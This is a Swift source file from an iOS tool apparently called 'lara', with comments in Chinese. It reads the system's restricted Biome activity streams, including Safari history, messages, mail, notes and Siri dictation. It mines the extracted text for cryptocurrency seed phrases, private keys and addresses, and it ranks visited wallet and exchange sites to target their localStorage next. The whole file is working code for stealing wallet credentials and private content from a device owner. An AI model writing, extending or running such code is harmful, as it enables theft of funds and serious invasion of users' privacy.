//
//  BiomeReader.swift
//  lara
//
//  读 iOS 自己的 Biome 活动索引 —— 尤其是 Safari 访问记录和用户活动元数据。
//
//  Biome 是 iOS 的「事件流」系统（自 iOS 15 起），把系统各处的事件写成
//  固定大小的环形缓冲文件：
//    /private/var/mobile/Library/Biome/streams/<public|restricted>/<Stream>/local/<id>
//
//  对我们有用的几个 stream（真机验证过）：
//    restricted/SafariPageView      每个 Safari 页面的 URL + 标题 + 内容捐赠
//    restricted/UserActivityMetadata  Handoff/用户活动：title, webpageURL
//    public/TextInputSession        文本输入会话（多数是二进制噪声，但含片段）
//    public/Notification            通知内容
//    restricted/NotesContent        备忘录内容（用户开了才写）
//    restricted/MessagesContent     短信内容
//    restricted/MailContent         邮件内容
//    restricted/ThirdPartyAppContent 第三方 App 内容
//    restricted/SiriDictation       Siri 听写原文
//
//  文件格式：文件头 "SEGB" + 一堆 protobuf 记录 + NSKeyedArchiver bplist 片段。
//  大部分是定长 1 MB / 16 MB 的环形缓冲，实际数据只占很小一段。
//  所以策略是：抽 UTF-8 可打印串（含中文），再过滤掉内部符号。
//
//  价值定位：
//    SafariPageView 本身不含助记词，但它告诉我们「用户用过哪个网页钱包」，
//    从而把后续的 localStorage / IndexedDB 挖掘聚焦到正确的域。
//

import Foundation

final class BiomeReader {

    static let shared = BiomeReader()
    private init() {}

    private var mgr: laramgr { laramgr.shared }

    static let root = "/private/var/mobile/Library/Biome/streams"

    /// 按优先级排列的 stream
    static let streams: [(String, String, String)] = [
        ("restricted", "SafariPageView", "Safari页面"),
        ("restricted", "UserActivityMetadata", "用户活动"),
        ("public", "Notification", "通知"),
        ("public", "TextInputSession", "文本输入"),
        ("restricted", "NotesContent", "备忘录内容流"),
        ("restricted", "MessagesContent", "短信内容流"),
        ("restricted", "MailContent", "邮件内容流"),
        ("restricted", "ThirdPartyAppContent", "第三方App内容流"),
        ("restricted", "SiriDictation", "Siri听写"),
        ("restricted", "SiriQuery", "Siri查询"),
        ("restricted", "RemindersContent", "提醒事项内容流"),
    ]

    // Biome 内部符号，过滤掉
    private static let internalTokens: Set<String> = [
        "SEGB", "bplist00", "NSKeyedArchiver", "NSKeyedUnarchiver",
        "PageContentDonation", "dynamicActivityType", "persistentIdentifier",
        "webpageURL", "expirationDate", "$objects", "$archiver", "$top",
        "$version", "$classname", "$classes", "$null", "NSDictionary",
        "NSString", "NSDate", "NSURL", "NSNumber",
    ]

    struct StreamData {
        var name: String
        var label: String
        var files: Int
        var bytes: Int
        var strings: [String]
    }

    // MARK: - 读

    func readAll(maxPerStream: Int = 400) -> [StreamData] {
        var out: [StreamData] = []
        for (kind, name, label) in BiomeReader.streams {
            let dir = "\(BiomeReader.root)/\(kind)/\(name)/local"
            guard let kids = FileAccess.listDir(dir) else { continue }
            var files = 0
            var bytes = 0
            var strs: [String] = []
            for k in kids where !k.isDir {
                if k.name == "tombstone" { continue }
                let p = dir + "/" + k.name
                let sz = FileAccess.size(p)
                if sz <= 0 || sz > 64 << 20 { continue }
                guard let d = FileAccess.read(p, maxSize: 32 << 20) else { continue }
                files += 1
                bytes += d.count
                strs += extractStrings(d, minLen: 4)
            }
            let cleaned = cleanStrings(strs, cap: maxPerStream)
            if !cleaned.isEmpty || files > 0 {
                out.append(StreamData(name: name, label: label,
                                      files: files, bytes: bytes,
                                      strings: cleaned))
            }
            if files > 0 {
                mgr.logmsg("[bm] \(name)：\(files) 文件 \(bytes) B，提出 \(cleaned.count) 段")
            }
        }
        return out
    }

    // MARK: - 抽字符串

    /// 抽 UTF-8 可打印串（含中文）
    func extractStrings(_ data: Data, minLen: Int = 4) -> [String] {
        var out: [String] = []
        let bytes = [UInt8](data)
        var cur = [UInt8]()
        var i = 0
        let n = bytes.count
        func flush() {
            if cur.count >= minLen {
                if let s = String(bytes: cur, encoding: .utf8) {
                    out.append(s)
                }
            }
            cur.removeAll(keepingCapacity: true)
        }
        while i < n {
            let b = bytes[i]
            if b >= 0x20 && b <= 0x7e {
                cur.append(b)
                i += 1
                continue
            }
            if b >= 0xc0 {
                let ln = b >= 0xf0 ? 4 : (b >= 0xe0 ? 3 : 2)
                if i + ln <= n {
                    let slice = Array(bytes[i..<(i + ln)])
                    if let s = String(bytes: slice, encoding: .utf8), isValid(s) {
                        cur.append(contentsOf: slice)
                        i += ln
                        continue
                    }
                }
            }
            flush()
            i += 1
        }
        flush()
        return out
    }

    private func isValid(_ s: String) -> Bool {
        for u in s.unicodeScalars {
            let v = u.value
            if v == 0x20 || v == 0x09 || v == 0x0a { continue }
            if v >= 0x20 && v <= 0x7e { continue }
            if v >= 0x2e80 { continue }
            if v >= 0xa0 && v <= 0x2e7f { continue }
            return false
        }
        return true
    }

    /// 过滤掉内部符号、乱码、纯坐标噪声
    private func cleanStrings(_ strs: [String], cap: Int) -> [String] {
        var seen = Set<String>()
        var out: [String] = []
        for s in strs {
            let t = s.trimmingCharacters(in: .whitespacesAndNewlines)
            guard t.count >= 4 else { continue }
            if seen.contains(t) { continue }
            if BiomeReader.internalTokens.contains(t) { continue }
            // 内部类名
            if t.hasPrefix("NS") && !t.contains(" ") { continue }
            if t.hasPrefix("_$s") || t.hasPrefix("__swift") { continue }
            // 纯 hex
            if t.count >= 32 && t.allSatisfy({ $0.isHexDigit }) { continue }
            // 噪声比例过高（坐标浮点转成的 ASCII）
            let printable = t.filter { $0.isLetter || $0.isNumber || $0 == " " }.count
            if Double(printable) / Double(t.count) < 0.6 { continue }
            // 有意义的判定：含空格 / 含中文 / 看起来像 URL 或标识
            let hasSpace = t.contains(" ")
            let hasCJK = t.unicodeScalars.contains { $0.value >= 0x2e80 }
            let looksURL = t.lowercased().hasPrefix("http")
            let looksDomain = t.contains(".") && !t.contains(" ")
            let looksBundle = t.contains(".") && t.hasPrefix("com.")
            if !(hasSpace || hasCJK || looksURL || looksDomain || looksBundle) {
                continue
            }
            seen.insert(t)
            out.append(t)
            if out.count >= cap { break }
        }
        return out
    }

    // MARK: - 提取 Safari 访问的站点（用于聚焦 localStorage 挖掘）

    /// 返回所有 http(s) URL
    func safariURLs() -> [String] {
        let dir = "\(BiomeReader.root)/restricted/SafariPageView/local"
        guard let kids = FileAccess.listDir(dir) else { return [] }
        var urls = Set<String>()
        for k in kids where !k.isDir {
            let p = dir + "/" + k.name
            guard let d = FileAccess.read(p, maxSize: 64 << 20) else { continue }
            let strs = extractStrings(d, minLen: 8)
            for s in strs {
                if s.lowercased().hasPrefix("http") && s.contains(".") {
                    urls.insert(s)
                }
            }
        }
        return Array(urls).sorted()
    }

    /// 判断 URL 是否像钱包 / dApp / 交易所
    static let walletHostPatterns = [
        "metamask", "wallet", "tronlink", "imtoken", "tokenpocket", "trustwallet",
        "phantom", "coinbase", "binance", "okx", "tonkeeper", "coin98",
        "uniswap", "pancakeswap", "opensea", "dapp", "web3", "defi",
        "bitpie", "safepal", "mathwallet", "onekey", "ledger", "trezor",
        "mytokenpocket", "bitkeep", "rabbit", "foxwallet", "xdefi",
    ]

    func classifyWalletSites() -> [(String, Bool)] {
        let urls = safariURLs()
        var out: [(String, Bool)] = []
        for u in urls {
            let low = u.lowercased()
            let isWallet = BiomeReader.walletHostPatterns.contains { low.contains($0) }
            out.append((u, isWallet))
        }
        // 钱包站排前面
        return out.sorted { a, b in
            if a.1 != b.1 { return a.1 }
            return a.0 < b.0
        }
    }

    // MARK: - 并入内容狩猎

    func scanAll(progress: @escaping (String) -> Void) {
        let datas = readAll()
        progress("Biome：\(datas.count) 个 stream 有数据")
        var total = 0
        for d in datas {
            let joined = d.strings.joined(separator: " ")
            // 助记词
            let mns = MnemonicDetector.findMnemonics(in: joined)
            for m in mns {
                total += 1
                ContentHunter.shared.add(Hit(source: .files,
                                             where_: "Biome/\(d.name)",
                                             kind: "助记词", value: m,
                                             extra: "from=biome"))
            }
            // 地址 / 私钥
            for (addr, chain) in AddressExtractor.findAddresses(in: joined) {
                ContentHunter.shared.add(Hit(source: .files,
                                             where_: "Biome/\(d.name)",
                                             kind: "地址", value: addr, extra: chain))
            }
        }
        // Safari 站点
        let sites = classifyWalletSites()
        let walletSites = sites.filter { $0.1 }
        progress("Biome Safari 站点 \(sites.count) 个，其中像钱包/交易所 \(walletSites.count) 个")
        for (u, isW) in sites.prefix(80) {
            ContentHunter.shared.add(Hit(
                source: .browser,
                where_: "Biome/SafariPageView",
                kind: isW ? "钱包站点" : "访问站点",
                value: u,
                extra: isW ? "★优先挖此域 localStorage" : ""))
        }
        progress("Biome 命中凭证 \(total) 条")
    }

    /// 报告行
    func summaryLines() -> [String] {
        var lines: [String] = []
        let datas = readAll()
        for d in datas {
            lines.append("\(d.label)（\(d.name)）：\(d.files) 文件 \(d.bytes / 1024) KB，\(d.strings.count) 段")
        }
        let sites = classifyWalletSites()
        let w = sites.filter { $0.1 }
        if !sites.isEmpty {
            lines.append("Safari 站点 \(sites.count) 个，钱包类 \(w.count) 个")
            for (u, _) in w.prefix(10) {
                lines.append("  ★ \(u)")
            }
        }
        return lines
    }
}
